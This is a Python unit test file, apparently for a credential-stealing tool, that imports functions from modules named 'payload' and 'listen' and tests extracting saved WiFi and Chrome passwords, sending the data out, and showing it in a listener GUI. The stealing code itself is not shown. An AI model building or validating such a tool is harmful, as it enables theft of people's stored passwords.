import unittest
from payload import extract_wifi_passwords, extract_browser_passwords, send_data
from listen import display_data, output_text

class TestPasswordExtractor(unittest.TestCase):
    def test_extract_wifi_passwords(self):
        passwords = extract_wifi_passwords()
        self.assertIsInstance(passwords, list, "Output should be a list")
        self.assertTrue(all(isinstance(entry, str) for entry in passwords), "Each entry should be a string")

    def test_extract_browser_passwords(self):
        passwords = extract_browser_passwords("Chrome")
        self.assertIsInstance(passwords, list, "Output should be a list")
        self.assertTrue(all(isinstance(entry, str) for entry in passwords), "Each entry should be a string")

    def test_send_data(self):
        try:
            send_data()
            self.assertTrue(True)  # If no exception occurs, the test passes
        except Exception as e:
            self.fail(f"send_data() failed with error: {e}")

    def test_gui_display(self):
        sample_data = {
            "WiFi Passwords": ["Home_WiFi: password123"],
            "Chrome Passwords": ["Website: https://example.com, Username: user, Password: pass"]
        }
        display_data(sample_data)
        self.assertNotEqual(output_text.get("1.0", "end").strip(), "", "GUI output should not be empty")

if __name__ == "__main__":
    unittest.main()
